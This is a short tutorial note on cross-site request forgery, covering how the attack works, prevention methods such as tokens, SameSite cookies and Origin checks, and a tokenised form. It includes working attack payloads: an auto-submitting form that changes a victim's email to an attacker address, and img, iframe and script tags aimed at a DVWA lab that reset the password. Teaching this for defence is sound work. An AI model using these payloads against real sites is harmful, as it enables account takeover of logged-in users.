# Cross-site Request Forgery (CSRF / XSRF)

Cross-site Request Forgery (CSRF) is a web security attack where an attacker tricks an authenticated user into performing unwanted actions on a web application where they are logged in.

### ğŸ“Œ How CSRF Works

An attacker creates a malicious form or script that automatically submits a request to a vulnerable website using the victimâ€™s authentication cookies.

### Example:
    
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    
    <script>
        document.forms[0].submit();
    </script>


If the victim is logged in, the browser automatically includes cookies â†’ the request is accepted as legitimate.

###  CSRF Prevention Methods

- Use unique CSRF tokens in forms and validate them on the server.

- Check the Referer or Origin header.

- Use SameSite cookie attribute to block cross-site cookie sending.

- Require non-simple requests using JavaScript fetch() with custom headers.

### ğŸ“ Example: CSRF Token in a Form
    <form action="/transfer" method="POST">
        <input type="hidden" name="amount" value="100" />
        <input type="hidden" name="csrf_token" value="random-generated-token" />
        <button type="submit">Transfer</button>
    </form>

### ğŸ”¥ CSRF Trigger Tags

Attackers use specific HTML tags to trigger CSRF automatically when the victim loads a malicious page.

  Below are common examples (using DVWA).

 1. <img> Tag â€” Simple GET Request Trigger

          <img src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change">


    Loads automatically and sends the request.

 2. <iframe> Tag â€” Hidden Auto-Trigger

          <iframe src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"></iframe>


    Often hidden with zero width/height to avoid detection.

 3. <script> Tag â€” Loads JavaScript From Target

           <script type="text/javascript" src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"></script>


    Useful when the endpoint returns valid JavaScript.
